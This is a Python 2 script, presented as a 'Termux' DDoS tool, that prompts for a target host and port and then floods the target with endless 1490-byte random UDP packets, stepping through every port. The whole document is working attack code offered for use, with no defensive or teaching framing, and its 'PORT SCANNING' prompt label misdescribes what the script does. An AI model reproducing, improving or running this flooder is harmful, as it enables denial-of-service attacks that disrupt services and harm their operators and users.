import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("""\033[1;31m
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
M       YMM M       YMM MMP     YMM MP       MM
M  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M
M  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM
M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M
M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M
M        MM M        MM MMb     dMM Mb       dM
MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM""")
print("\033[41m\033[1;37m  Distributed Denial of Service - Termux Tools  \033[0m")
print(" ")
print("\033[1;33mAuthor   : \033[1;37mPembriAhmad ")
print("\033[1;33mGithub   : \033[1;37mhttps://github.com/pembriahmad ")
print("\033[1;33mSource   : \033[1;37mhttps://github.com/pembriahmad/DDOS ")
print(" ")
print("\033[1;32mPress CTRL+C to stop sending")
print(" ")
print("\033[1;37m------------ \033[0m")
print("\033[1;37mINPUT TARGET \033[0m")
print("\033[1;37m------------ \033[0m")
ip = raw_input("\033[37m[*] \033[91mIP or HOSTNAME :\033[32m ")
port = input("\033[37m[*] \033[91mPORT SCANNING  :\033[32m ")
os.system("clear")
print(" Run DDOS Attack.")
time.sleep(1)
os.system("clear")
print(" Run DDOS Attack..")
time.sleep(1)
os.system("clear")
print(" Run DDOS Attack...")
time.sleep(1)
os.system("clear")
print(" Run DDOS Attack.")
time.sleep(1)
os.system("clear")
print(" Run DDOS Attack..")
time.sleep(1)
os.system("clear")
print(" Run DDOS Attack...")
time.sleep(1)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
